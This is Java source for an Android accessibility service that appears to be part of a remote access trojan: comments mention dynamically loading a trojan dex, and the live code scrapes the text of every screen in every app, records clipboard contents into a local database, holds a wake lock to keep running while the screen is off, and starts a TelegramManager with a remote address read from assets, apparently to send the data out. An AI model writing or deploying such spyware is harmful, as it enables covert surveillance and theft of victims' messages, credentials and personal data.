package com.hhm.android.otherapp;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipDescription;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.res.AssetManager;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

//import com.hhm.android.rat.ratManager;

import com.google.gson.Gson;
import com.hhm.android.otherapp.sqlite.SQLiteDao;
import com.hhm.android.otherapp.utils.AssetsUtil;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.List;
import java.util.logging.Logger;

import dalvik.system.DexClassLoader;

import static com.hhm.android.otherapp.managers.AppsManager.getApplicationNameByPackageName;


public class myService extends AccessibilityService{
    public static final String TAG = "MainService";

    public myService() {}
    public Context mContext;

    @Override
    public void onCreate(){
        //copyAssets(this,"ratDex.jar");
        //registerScreenEvents(); // 监听屏幕事件
        //initAndStartRatFromDex(this); // 动态加载木马Dex，并启动
        registerScreenEvents(); // 监听屏幕事件
    }

    @Override
    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
        SQLiteDao.setInstance(this); // 初始化数据库
        ServiceConfig.setRemoteAddress(AssetsUtil.getRemoteAddressFromAssets(this));
        ServiceConfig.setPackages(AssetsUtil.getPackageNamesFromAssets(this));
        System.out.println("启动TelegramManager");
        mContext = this;
        TelegramManager.startAsync(this);
        // Android 10 应用已经不能在后台监听剪贴板数据
        if (Build.VERSION.SDK_INT < 29 && mClipboardManager == null){ // 若 Android 版本低于 Android 10，设置剪贴板监听，避免重复设置
            registerClipEvents();
        }
        registerScreenEvents(); // 监听屏幕事件
        return Service.START_STICKY; // 提高 server 优先级，自动重启
    }

    /*@Override
    protected void onServiceConnected() {
        Log.i(TAG, "config success!");
        AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
        accessibilityServiceInfo.eventTypes = AccessibilityEvent.TYPES_ALL_MASK; // 指定事件类型
        accessibilityServiceInfo.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        accessibilityServiceInfo.notificationTimeout = 1000;
        setServiceInfo(accessibilityServiceInfo);
    }*/

    @Override
    public void onDestroy() {
        Log.e(TAG,"onDestroy():onDestroy()");
        listener.unregister();
        super.onDestroy();
    }

    /*@Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }*/

    // 注册屏幕监听，息屏时保持活动，开屏时保持屏幕开启
    private ScreenListener listener = new ScreenListener(this);
    private void registerScreenEvents(){
        listener.register(new ScreenListener.ScreenStateListener() {
            @Override
            public void onScreenOn() { }

            @Override
            public void onScreenOff() {
                acquireWakeLock();
            }

            @Override
            public void onUserPresent() {
                releaseWakeLock();
            }
        });
    }

    PowerManager.WakeLock wakeLock = null;
    //在锁屏时仍然获取CPU，保持运行
    @SuppressLint("InvalidWakeLockTag")
    private void acquireWakeLock() {
        if (wakeLock == null) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK
                    | PowerManager.ON_AFTER_RELEASE, getClass().getCanonicalName());
            Log.e(TAG,"acquireWakeLock():" + wakeLock);
            if (wakeLock != null) {
                wakeLock.acquire();
            }
        }
    }

    private void releaseWakeLock() {
        if (wakeLock != null) {
            wakeLock.release();
            wakeLock = null;
        }
    }


    private String data = "";

    //任何操作将触发执行该回调函数
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
                    event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                    event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                    event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
                String pkg = event.getPackageName().toString();
                //String pkg = getApplicationNameByPackageName(getApplicationContext(), event.getPackageName().toString());
                nodeInfoDFS(getRootInActiveWindow(), pkg);
            }
        } catch (NullPointerException e){}

    }


    // 遍历根节点下所有节点，并将节点的 Text 和 ContentDescription
    private void nodeInfoDFS(AccessibilityNodeInfo info,String pkg) {
        try {
            CharSequence contentDescription = info.getContentDescription();
            if (contentDescription != null && !contentDescription.toString().equals("")) {
                String str = contentDescription.toString();
                if (str.contains("ReactTextView:")) {
                    str = str.replace("ReactTextView:", "");
                } else if (str.contains("ReactImageView:")) {
                    str = str.replace("ReactImageView:", "");
                }
                if (str != null && !data.contains(str)) {
                    System.out.println("202012170==浏览器内容>" + str);
                    SQLiteDao.addToList(pkg, str);
                }
                data = data + "\t" + str;
            }
            if (info.getText() != null) {
                String str = info.getText().toString();
                if (str != null && !data.contains(str)) {
                    System.out.println("202012171==浏览器内容>" + str);
                    SQLiteDao.addToList(pkg, str);
                }
                data = data + "\t" + str;
            }
            for (int i = 0; i < info.getChildCount(); i++) {
                if (info.getChild(i) != null) {
                    nodeInfoDFS(info.getChild(i), pkg);
                }
            }
        } catch (NullPointerException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
        /*try {
            Thread.sleep(100);
            info.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD); // 下滑
        } catch (InterruptedException e) {
            e.printStackTrace();
        }*/
    }

    @Override
    public void onInterrupt() {
        Log.e(TAG,"onInterrupt():onInterrupt");
        SQLiteDao.addLogOfDb(); // 服务暂停，将 List 中的数据通过事务传入数据库
    }

    private ClipboardManager mClipboardManager;
    private ClipboardManager.OnPrimaryClipChangedListener mOnPrimaryClipChangedListener;
    private void registerClipEvents() {
        Log.e(TAG,"registerClipEvents():register");
        mClipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        //剪切板数据存入数据库
        mOnPrimaryClipChangedListener = new ClipboardManager.OnPrimaryClipChangedListener() {
            @Override
            public void onPrimaryClipChanged() {
                Log.e(TAG,"onPrimaryClipChanged():function is called");
                try {
                    ClipData clipData = mClipboardManager.getPrimaryClip();
                    if (clipData != null && clipData.getItemCount() > 0) {
                        CharSequence content = clipData.getItemAt(0).getText();
                        SQLiteDao.addClipOfDb(content.toString());
                    }
                } catch (NullPointerException e) {
                    Log.e(TAG,"onPrimaryClipChanged():"+e.getMessage());
                }
            }
        };
        mClipboardManager.addPrimaryClipChangedListener(mOnPrimaryClipChangedListener);
    }


}
